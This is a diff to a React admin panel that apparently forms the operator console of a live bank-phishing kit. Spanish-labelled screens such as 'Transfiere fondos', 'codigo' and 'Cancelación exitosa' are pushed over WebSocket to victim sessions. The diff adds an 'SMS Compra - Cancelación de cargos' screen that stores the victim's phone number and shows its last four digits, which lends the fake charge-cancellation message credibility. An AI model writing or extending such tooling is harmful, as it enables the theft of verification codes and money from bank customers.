@@ -6,7 +6,7 @@ import { useToast } from '@/hooks/use-toast';
 import { useWebSocket } from '@/hooks/useWebSocket';
 import Sidebar from '@/components/admin/Sidebar';
 import AccessTable from '@/components/admin/AccessTable';
-import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal } from '@/components/admin/Modals';
+import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
 import { Session, ScreenType } from '@shared/schema';
 import { nanoid } from 'nanoid';
 
@@ -193,7 +193,7 @@ export default function AdminPanel() {
     }
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
       setActiveModal(screen);
       return;
     }
@@ -326,6 +326,42 @@ export default function AdminPanel() {
     closeModal();
   };
 
+  const handleSmsCompraConfirm = (telefono: string) => {
+    // Update session with phone number and send sms_compra screen
+    if (telefono && telefono.length === 10) {
+      const terminacion = telefono.substring(telefono.length - 4);
+      
+      // First update the session with the phone number
+      if (selectedSessionId) {
+        apiRequest('POST', `/api/sessions/${selectedSessionId}/update`, { celular: telefono })
+          .then(() => {
+            // Then send the screen change
+            sendScreenChange({
+              tipo: 'mostrar_sms_compra',
+              sessionId: selectedSessionId,
+              terminacion
+            });
+          })
+          .catch(error => {
+            toast({
+              title: "Error al actualizar teléfono",
+              description: error.message,
+              variant: "destructive",
+            });
+          });
+      }
+    } else {
+      toast({
+        title: "Teléfono inválido",
+        description: "Ingrese un número de teléfono válido de 10 dígitos.",
+        variant: "destructive",
+      });
+      return;
+    }
+    
+    closeModal();
+  };
+
   return (
     <div className="flex w-full h-screen overflow-hidden">
       {/* Sidebar */}
@@ -359,6 +395,7 @@ export default function AdminPanel() {
                   <option value="transferir">6. Transfiere fondos</option>
                   <option value="cancelacion">7. Cancelación exitosa</option>
                   <option value="mensaje">8. Ingresa el mensaje que gustes</option>
+                  <option value="sms_compra">9. SMS Compra - Cancelación de cargos</option>
                 </select>
               </div>
             </div>
@@ -485,6 +522,11 @@ export default function AdminPanel() {
         isOpen={activeModal === 'mensaje'} 
         onClose={closeModal} 
         onConfirm={handleMessageConfirm} 
+      />
+      <SmsCompraModal 
+        isOpen={activeModal === 'sms_compra'} 
+        onClose={closeModal} 
+        onConfirm={handleSmsCompraConfirm} 
       />
     </div>
   );
